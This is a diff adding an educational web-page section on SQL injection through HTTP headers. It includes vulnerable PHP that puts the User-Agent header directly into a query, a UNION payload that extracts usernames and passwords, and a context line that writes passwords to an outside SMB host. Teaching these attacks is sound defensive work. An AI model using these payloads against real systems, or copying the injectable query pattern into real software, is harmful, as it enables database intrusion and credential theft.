@@ -2494,6 +2494,186 @@ SELECT password INTO OUTFILE '\\\\10.10.162.175\\logs\\creds.txt';
   </tbody>
 </table>
 
+<h1 id="sql-injection-through-http-headers-the-silent-backdoor">SQL Injection Through HTTP Headers: The Silent Backdoor</h1>
+
+<p>Most SQL Injection tutorials focus on form inputs or URL parameters, but savvy attackers know headers can be just as juicy attack vectors.</p>
+
+<p>HTTP headers like <strong>User-Agent</strong>, <strong>X-Forwarded-For</strong>, or <strong>Referer</strong> often contain untrusted, user-controlled data. When your app blindly plugs these header values into SQL queries without sanitization you get a stealthy and overlooked SQL Injection channel.</p>
+
+<hr />
+
+<h2 id="why-headers">Why Headers?</h2>
+
+<p>Headers travel with every HTTP request, and many apps log them or use them in database queries for tracking, analytics, or access control. Unlike form data, headers are easy to overlook during input validation.</p>
+
+<hr />
+
+<h2 id="how-sqli-in-headers-works">How SQLi in Headers Works</h2>
+
+<p>Say your PHP app logs the User-Agent header in the database:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$query = "INSERT INTO logs (user_agent) VALUES ('$userAgent')";
+</code></pre>
+</div>
+
+<p>If an attacker sends a malicious User-Agent like:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+' OR '1'='1
+</code></pre>
+</div>
+
+<p>The SQL becomes:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+INSERT INTO logs (user_agent) VALUES ('' OR '1'='1');
+</code></pre>
+</div>
+
+<p>If the query expects a string but the injection breaks out and changes logic, attackers can:</p>
+
+<ul>
+  <li>
+    <p>Dump data by exploiting UNION SELECT in vulnerable SELECT queries</p>
+  </li>
+  <li>
+    <p>Bypass filters by injecting always-true conditions</p>
+  </li>
+  <li>
+    <p>Corrupt or escalate data integrity</p>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="common-headers-to-watch">Common Headers to Watch</h2>
+
+<ul>
+  <li>
+    <p><strong>User-Agent:</strong> Browser or tool identification string</p>
+  </li>
+  <li>
+    <p><strong>X-Forwarded-For:</strong> Client IP chain, often trusted blindly</p>
+  </li>
+  <li>
+    <p><strong>Referer:</strong> Previous page URL, attacker-controlled</p>
+  </li>
+  <li>
+    <p><strong>Cookie:</strong> Session data carriers</p>
+  </li>
+  <li>
+    <p><strong>X-Api-Key / Authorization:</strong> Sometimes mishandled in backend</p>
+  </li>
+</ul>
+
+<h4 id="attack-example">Attack Example</h4>
+
+<p><strong>Code Breakdown</strong></p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+$query = "SELECT id, ip, user_agent, note FROM logins WHERE user_agent = '$ua'";
+$result = $mysqli-&gt;query($query);
+</code></pre>
+</div>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">$ua</code> is taken <strong>directly from the HTTP User-Agent header</strong>.</p>
+  </li>
+  <li>
+    <p>It’s interpolated <strong>without escaping or validation</strong> inside a SQL query string.</p>
+  </li>
+  <li>
+    <p>If attacker crafts a User-Agent containing SQL syntax, it injects code into the query.</p>
+  </li>
+</ul>
+
+<h2 id="attack-vector-example">Attack Vector Example</h2>
+
+<p>Suppose attacker sends:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+User-Agent: ' UNION SELECT id, username, password, 'evil' FROM user; #
+</code></pre>
+</div>
+
+<p>The query becomes:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+SELECT id, ip, user_agent, note FROM logins WHERE user_agent = '' UNION SELECT id, username, password, 'evil' FROM user; # '
+</code></pre>
+</div>
+
+<p>What happens:</p>
+
+<ul>
+  <li>
+    <p>The first WHERE clause looks for empty string (no results).</p>
+  </li>
+  <li>
+    <p>UNION injects a second query that pulls usernames and passwords from <code class="language-plaintext highlighter-rouge">user</code> table.</p>
+  </li>
+  <li>
+    <p>The trailing <code class="language-plaintext highlighter-rouge">'</code> is commented out by <code class="language-plaintext highlighter-rouge">#</code>, so no syntax error.</p>
+  </li>
+  <li>
+    <p>The results mix into the output attacker extracts sensitive data.</p>
+  </li>
+</ul>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Cky9Qb2di_0LlpwaJ6B8Pg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
     </section>
 
     <footer class="mt-8 text-sm text-gray-400">
